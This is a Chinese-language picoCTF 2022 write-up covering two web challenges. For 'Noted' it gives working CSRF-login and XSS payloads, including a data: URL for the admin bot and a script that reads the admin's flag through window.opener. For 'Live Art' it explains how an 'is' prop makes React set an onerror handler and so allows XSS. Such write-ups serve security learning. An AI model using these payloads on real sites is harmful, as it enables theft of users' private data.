---
title: picoCTF 2022 筆記
catalog: true
date: 2022-04-10 12:03:34
tags: [Security]
categories: [Security]
---

這次有兩題 Web 比較難，解掉了一題，另一題解不開但解法超值得一看，照樣簡單寫個心得。

<!-- more -->

## Noted

連結在這：https://play.picoctf.org/practice/challenge/282

簡單來說狀況是這樣的，這是一個常見的可以新增 note 的系統，在 /notes 頁面可以看到自己所有的 note，然後有個 self XSS，然後現在有個處於登入狀態下的 admin 會造訪你提供的 URL，要想辦法拿到 admin 的筆記內容。

程式碼：

``` js
fastify.after(() => {
  fastify.get('/', (req, res) => {
    if (req.user) return res.redirect('/notes');
    return res.view('login');
  });

  fastify.post('/login', { schema: userSchema }, async (req, res) => {
    let { username, password } = req.body;
    username = username.toLowerCase();

    let user = await User.findOne({ where: { username }});
    if (user === null) {
      return res.status(400).send('User not found');
    }

    if (!(await argon2.verify(user.password, password))) {
      return res.status(400).send('Wrong password!');
    }

    req.session.set('user', user.username);

    return res.redirect('/notes');
  });

  fastify.get('/register', (req, res) => {
    return res.view('register');
  });

  fastify.post('/register', { schema: userSchema }, async (req, res) => {
    let { username, password } = req.body;
    username = username.toLowerCase();

    let user = await User.findOne({ where: { username }});
    if (user) {
      return res.status(400).send('User already exists!');
    }

    await User.create({
      username,
      password: await argon2.hash(password)
    });

    req.session.set('user', username);

    return res.redirect('/notes');
  });

  fastify.get('/notes', auth(async (req, res) => {
    return res.view('notes', {
      notes: req.user.notes, 
      csrf: await res.generateCsrf()
    });
  }));

  fastify.get('/new', auth(async (req, res) => {
    return res.view('new', { csrf: await res.generateCsrf() }); 
  }));

  fastify.post('/new', {
    schema: noteSchema,
    preHandler: fastify.csrfProtection
  }, auth(async (req, res) => {
    let { title, content } = req.body;

    await Note.create({
      title,
      content,
      userId: req.user.id
    });

    return res.redirect('/notes');
  }));

  fastify.post('/delete', {
    schema: deleteSchema,
    preHandler: fastify.csrfProtection
  }, auth(async (req, res) => {
    let { id } = req.body;

    let deleted = false;

    for (let note of req.user.notes) {
      if (note.id === id) {
        await note.destroy();

        deleted = true;
      }
    }

    if (deleted) {
      return res.redirect('/notes');
    } else {
      res.status(400).send('Note not found!');
    }
  }));

  fastify.get('/report', auth(async (req, res) => {
    return res.view('report', { csrf: await res.generateCsrf() });
  }));

  fastify.post('/report', {
    schema: reportSchema,
    preHandler: fastify.csrfProtection
  }, auth((req, res) => {
    let { url } = req.body;

    if (report.open) {
      return res.send('Only one browser can be open at a time!');
    } else {
      report.run(url);
    }

    return res.send('URL has been reported.');
  }));
}) 
```

bot 的程式碼：

``` js
const crypto = require('crypto');
const puppeteer = require('puppeteer');

async function run(url) {
  let browser;

  try {
    module.exports.open = true;
    browser = await puppeteer.launch({
      headless: true,
      pipe: true,
      args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
      slowMo: 10
    });

    let page = (await browser.pages())[0]

    await page.goto('http://0.0.0.0:8080/register');
    await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
    await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

    await Promise.all([
      page.click('[type="submit"]'),
      page.waitForNavigation({ waituntil: 'domcontentloaded' })
    ]);

    await page.goto('http://0.0.0.0:8080/new');
    await page.type('[name="title"]', 'flag');
    await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');

    await Promise.all([
      page.click('[type="submit"]'),
      page.waitForNavigation({ waituntil: 'domcontentloaded' })
    ]);

    await page.goto('about:blank')
    await page.goto(url);
    await page.waitForTimeout(7500);

    await browser.close();
  } catch(e) {
    console.error(e);
    try { await browser.close() } catch(e) {}
  }

  module.exports.open = false;
}

module.exports = { open: false, run }
```

題目敘述有說這題的 admin bot 沒有對外連線的功能，所以增加了一些額外的難度（不過其實有開就是了，看 discord 好像開賽前加回去了）。

不過這點先不討論，先來討論其他的。

這題有 csrf token 來防止 csrf，但登入的部分沒有，所以可以用 csrf 來登入，就可以順利在 admin 上執行 XSS。

如果 same site cookie 沒設定的話，其實就 iframe 一下很容易，像這樣：

``` html
<iframe name=f onload=run() src="http://0.0.0.0:8080/notes"></iframe>
<form id=form action="/login" target="_blank">
 <input name="username" value="user01">
 <input name="password" value="password">
</form>
<script>
  function run() {
    form.submit();
  }
</script>
```

先在頁面上面開好 iframe，裡面就會有 admin 的筆記，然後用 form csrf 一下，新開一個視窗出來。

接著只要在自己的帳號裡面弄出 XSS，用 `window.opener.frames['f'].document.body` 就可以拿到頁面的內容了， 雖然新開啟的頁面跟 window.opener 不同源，但因為跟 `window.opener.frames['f']` 同源所以沒差，一樣可以存取到。

不過這題的最大問題是 Chrome 預設的 default Lax，所以 iframe 不會帶 cookie，就沒辦法用了。

一個很直觀的解法是改用 `window.open` 來做，像這樣：

``` html
<form id=form action="/login" target="_blank">
 <input name="username" value="user01">
 <input name="password" value="password">
</form>
<script>
  win = window.open('http://0.0.0.0:8080/notes')
  form.submit()
</script>
```

但最大的問題是，在新開的視窗中沒辦法用 `window.opener.win` 來存取到開啟的 window，因為跟 `window.opener` 不同源，所以不讓你存取上面的東西。

如果兩個新開的 window 彼此間不能溝通，這該怎麼辦呢？

想了一陣子之後，突然靈機一動：「那就直接把 `window.opener` 變成要拿的頁面不就好了？」

像這樣：

``` html
<form id=form action="/login" target="_blank">
 <input name="username" value="user01">
 <input name="password" value="password">
</form>
<script>
  form.submit()
  location = 'http://0.0.0.0:8080/notes'
</script>
```

有種 race condition 的感覺，表單送出之後立刻跳轉頁面，這時候因為新的登入還沒完成，所以跳過去時還是 admin 的 session，因此在新的視窗登入完成後就可以直接拿 `window.opener.document` 的東西。

如果有連網的話，就樣就完成了。在沒有對外連線的情況下，可以發現 admin bot 沒有檢查網址，所以可以傳 `javascript:` 或是 `data:` 之類的東西給它，回傳 flag 的部分可以直接用新增筆記的方式。

讓 admin bot 訪問底下這段，其實就只是用 `data:text/html` 載入 html 而已：

```
data:text/html,<form id=f method=POST action=http://0.0.0.0:8080/login target=new_window><input name=username value=user01><input name=password value=password></form><script>f.submit();location='http://0.0.0.0:8080/notes'</script>
```

XSS payload，這邊直接新開一個 window 去做就好，也可以用 iframe 來做

``` js
<script>
  setTimeout(() => {
    var flag = window.opener.document.body.innerText
    var win = window.open('/new');
    setTimeout(() => {
      win.document.querySelector('textarea[name=content]').value = flag;
      win.document.querySelector('form').submit()
    }, 2000)
  }, 2000)
</script>
```

### 另一種解法

運用我前幾天在 [iframe 與 window.open 黑魔法](https://blog.huli.tw/2022/04/07/iframe-and-window-open/)學到的招數，也就是「當開啟同名 window 時會拿到 reference，不會新開 window」，這樣兩個新開的 window 就可以互相溝通了。

``` html
<form id=form action="/login" target="_blank">
 <input name="username" value="user01">
 <input name="password" value="password">
</form>
<script>
  window.open('http://0.0.0.0:8080/notes', 'flag')
  form.submit()
</script>
```

XSS 的部份這樣寫：

``` html
<script>
  var flagWin = window.open('xxx:abdef', 'flag')
  setTimeout(() => {
    var flag = flagWin.document.body.innerText
    var win = window.open('/new');
    setTimeout(() => {
      win.document.querySelector('textarea[name=content]').value = flag;
      win.document.querySelector('form').submit()
    }, 2000)
  }, 2000)
</script>
```

這篇也用了類似的解法：https://github.com/Scoder12/ctf/blob/main/PicoCTF%202022/web_noted.md

## Live Art

連結：https://play.picoctf.org/practice/challenge/277?page=1&search=live

這題我還沒有自己重現過，解法都是從這篇 [picoCTF 2022 WriteUps](https://blog.maple3142.net/2022/03/29/picoctf-2022-writeups/#live-art) 看來的，簡單記一下，主要的漏洞有兩個。

1. component 切換不當造成的 props 混淆
2. 利用 `is` 屬性攻擊 React

第二點特別有趣，所以這邊特別講一下第二點。

請問底下的 React app 有什麼問題？

``` js
export default function App() {
  const params = new URLSearchParams(location.search);
  let obj = {};

  params.forEach(function (value, key) {
    obj[key] = value;
  });

  return (
    <div className="App">
      <h1>Demo</h1>
      <img {...obj} />
    </div>
  );
}
```

這邊就只是把網址列上的 query string 變成 object 後丟進 img 去，`URLSearchParams` 預設的用法沒支援 array 跟 object，所以想產生 `dangerouslySetInnerHTML: { __html: '..'}` 是不可能的。

換句話說，今天如果可以控制 React render 中元素的 props，但是 value 只能是字串，可以做些什麼？

當 React 在設置屬性時，如果你寫 `<img onError="alert(1)">`，會跳出錯誤訊息：

``` 
Expected `onError` listener to be a function, instead got a value of `string` type.
```

改成小寫的版本，則是會跳 warning：

> Warning: Invalid event handler property `onerror`. Did you mean `onError`?

相關的檢查都在這邊：https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/shared/ReactDOMUnknownPropertyHook.js#L275

``` js
export function validateProperties(type, props, eventRegistry) {
  if (isCustomComponent(type, props)) {
    return;
  }
  warnUnknownProperties(type, props, eventRegistry);
}
```

而這邊可以注意到有個 `isCustomComponent` 的判斷，程式碼在這：https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/shared/isCustomComponent.js

``` js
function isCustomComponent(tagName: string, props: Object) {
  if (tagName.indexOf('-') === -1) {
    return typeof props.is === 'string';
  }
  switch (tagName) {
    // These are reserved SVG and MathML elements.
    // We don't mind this list too much because we expect it to never grow.
    // The alternative is to track the namespace in a few places which is convoluted.
    // https://w3c.github.io/webcomponents/spec/custom/#custom-elements-core-concepts
    case 'annotation-xml':
    case 'color-profile':
    case 'font-face':
    case 'font-face-src':
    case 'font-face-uri':
    case 'font-face-format':
    case 'font-face-name':
    case 'missing-glyph':
      return false;
    default:
      return true;
  }
}
```

只要 props 內的 is 是字串的話，就會是 true。

而 React 在設置屬性時也會有一些檢查：https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/client/DOMPropertyOperations.js#L151

簡單來說，如果是 custom element（props.is 是個字串）的話，很多屬性都會直接設定上去。

所以，如果有底下的程式碼：

``` html
function App() {
  return (
    <img src="x" onerror="alert(1)" is="abc" />
  )
}
```

就可以觸發 XSS！因為 is 的緣故，讓 React 直接設置了 `onerror` 的屬性。

我好興奮啊！寫 React 這麼久第一次知道這個特性，在攻擊 React app 上又多了一個攻擊面。

